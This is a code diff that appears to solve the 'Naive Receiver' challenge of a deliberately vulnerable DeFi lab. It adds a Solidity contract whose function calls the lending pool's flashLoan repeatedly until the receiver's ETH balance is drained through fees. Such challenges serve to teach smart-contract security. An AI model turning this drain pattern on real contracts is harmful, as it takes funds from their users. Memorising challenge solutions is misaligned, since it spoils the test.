@@ -66,3 +66,24 @@ contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
     // Allow deposits of ETH
     receive() external payable {}
 }
+
+contract flashLoanCaller is NaiveReceiverLenderPool {
+
+    NaiveReceiverLenderPool public pool;
+
+    constructor(NaiveReceiverLenderPool _pool) {
+        pool = _pool;
+    }
+
+    function nestFlashLoan(
+        IERC3156FlashBorrower receiver,
+        address token,
+        uint256 amount
+    )external returns(bool){
+        while ( address(receiver).balance > 0) {
+            pool.flashLoan(receiver,token,amount, "0x");
+        }
+        return true;
+    }
+
+}
